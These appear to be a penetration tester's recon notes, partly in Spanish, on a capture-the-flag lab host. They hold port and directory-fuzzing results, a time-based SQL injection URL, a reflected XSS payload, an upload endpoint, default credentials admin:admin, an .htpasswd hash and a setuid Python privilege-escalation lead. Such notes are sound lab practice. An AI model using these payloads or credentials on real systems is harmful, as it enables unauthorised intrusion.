puertos: 21,22,80,7080,8088,8715

# Notes

- 80 ebook -> sqli, xss
- 7080 -> https | openlitespeed v7.1 | upload | we can upload files
- 8088 -> upload.html  | cgi-bin/helloworld
- 8715 -> we can get files uploaded
- 
# 80

- Apache httpd 2.4.38 Debian
#### Fuzz
```root.fuzz
/index.html          [32m (Status: 200)[0m [Size: 655]
/ebook               [36m (Status: 301)[0m [Size: 300][34m [--> http://cou.fi/ebook/][0m
/index.html          [32m (Status: 200)[0m [Size: 655]
```

```ebook.fuzz
/contact.php         [32m (Status: 200)[0m [Size: 4155]
/admin.php           [32m (Status: 200)[0m [Size: 3153]
/checkout.php        [32m (Status: 200)[0m [Size: 2696]
/database            [36m (Status: 301)[0m [Size: 309][34m [--> http://cou.fi/ebook/database/][0m
/template            [36m (Status: 301)[0m [Size: 309][34m [--> http://cou.fi/ebook/template/][0m
/cart.php            [32m (Status: 200)[0m [Size: 2702]
/info.php            [32m (Status: 200)[0m [Size: 94884]
/index.php           [32m (Status: 200)[0m [Size: 3998]
/book.php            [32m (Status: 200)[0m [Size: 10]
/functions           [36m (Status: 301)[0m [Size: 310][34m [--> http://cou.fi/ebook/functions/][0m
/edit.php            [32m (Status: 200)[0m [Size: 16]
/books.php           [32m (Status: 200)[0m [Size: 5164]
/models              [36m (Status: 301)[0m [Size: 307][34m [--> http://cou.fi/ebook/models/][0m
/controllers         [36m (Status: 301)[0m [Size: 312][34m [--> http://cou.fi/ebook/controllers/][0m
/process.php         [32m (Status: 200)[0m [Size: 2016]
/purchase.php        [32m (Status: 200)[0m [Size: 2692]
/verify.php          [32m (Status: 200)[0m [Size: 69]
/.gitattributes      [32m (Status: 200)[0m [Size: 66]
/admin.php           [32m (Status: 200)[0m [Size: 3153]
/index.php           [32m (Status: 200)[0m [Size: 3998]
/info.php            [32m (Status: 200)[0m [Size: 94885]
/.                   [32m (Status: 200)[0m [Size: 3998]
/bootstrap           [36m (Status: 301)[0m [Size: 310][34m [--> http://cou.fi/ebook/bootstrap/][0m
/admin_edit.php      [36m (Status: 302)[0m [Size: 1927][34m [--> index.php][0m
/README.md           [32m (Status: 200)[0m [Size: 116]
/admin_add.php       [36m (Status: 302)[0m [Size: 3519][34m [--> index.php][0m

```

#### Sql injection

Can't save files from sqli.

```sqli
http://cou.fi/ebook/bookPerPub.php?pubid=1
http://cou.fi/ebook/book.php?bookisbn=978-1-484217-26-9'+or+sleep(10);--+-
```

#### XSS Reflected
```xss
http://cou.fi/ebook/book.php?bookisbn=978-1-484217-26-9'+union+select+1,2,3,4,5,6,"><script>alert(1)</script>"+order+by+7--+-
```

# 7080
- lite speed
#### fuzz
```root
/lib                 [36m (Status: 301)[0m [Size: 1260][34m [--> https://cou.fi:7080/lib/][0m
/docs                [36m (Status: 301)[0m [Size: 1260][34m [--> https://cou.fi:7080/docs/][0m
/index.php           [32m (Status: 200)[0m [Size: 686]
/view                [36m (Status: 301)[0m [Size: 1260][34m [--> https://cou.fi:7080/view/][0m
/res                 [36m (Status: 301)[0m [Size: 1260][34m [--> https://cou.fi:7080/res/][0m
/favicon.ico         [32m (Status: 200)[0m [Size: 1150]
/index.php           [32m (Status: 200)[0m [Size: 686]
/.                   [36m (Status: 301)[0m [Size: 1260][34m [--> https://cou.fi:7080/./][0m
```

```
view/dashboard.php
view/logviewer.php
view/confMgr.php
```

# 8088
- LiteSpeed 7.1
- PHP 5.3.36
- upload.html Nos permite subir archivos a `/opt/manager/html/katana_filename`
- Archivo `cgi-bin/helloworld`
- Hay 2 secciones en las que no tenemos permiso /protected y /blocked

#### fuzz
```
/cgi-bin             [36m (Status: 301)[0m [Size: 1260][34m [--> http://cou.fi:8088/cgi-bin/][0m
/css                 [36m (Status: 301)[0m [Size: 1260][34m [--> http://cou.fi:8088/css/][0m
/img                 [36m (Status: 301)[0m [Size: 1260][34m [--> http://cou.fi:8088/img/][0m
/docs                [36m (Status: 301)[0m [Size: 1260][34m [--> http://cou.fi:8088/docs/][0m
/upload.html         [32m (Status: 200)[0m [Size: 6480]
/upload.php          [32m (Status: 200)[0m [Size: 1800]
/index.html          [32m (Status: 200)[0m [Size: 655]
/protected           [36m (Status: 301)[0m [Size: 1260][34m [--> http://cou.fi:8088/protected/][0m
/error404.html       [32m (Status: 200)[0m [Size: 195]
/blocked             [36m (Status: 301)[0m [Size: 1260][34m [--> http://cou.fi:8088/blocked/][0m
/phpinfo.php         [32m (Status: 200)[0m [Size: 50721]
/index.html          [32m (Status: 200)[0m [Size: 655]
/phpinfo.php         [32m (Status: 200)[0m [Size: 50721]
/.                   [36m (Status: 301)[0m [Size: 1260][34m [--> http://cou.fi:8088/./][0m
```

# 8715
- nginx 1.14.2
Basic authentication -> admin:**admin**


# Privesc

/usr/bin/python2.7 setuid cap
.htpasswd `admin:$apr1$1xby0ne1$riRBQEbOQovyW3qF1iqlZ1`
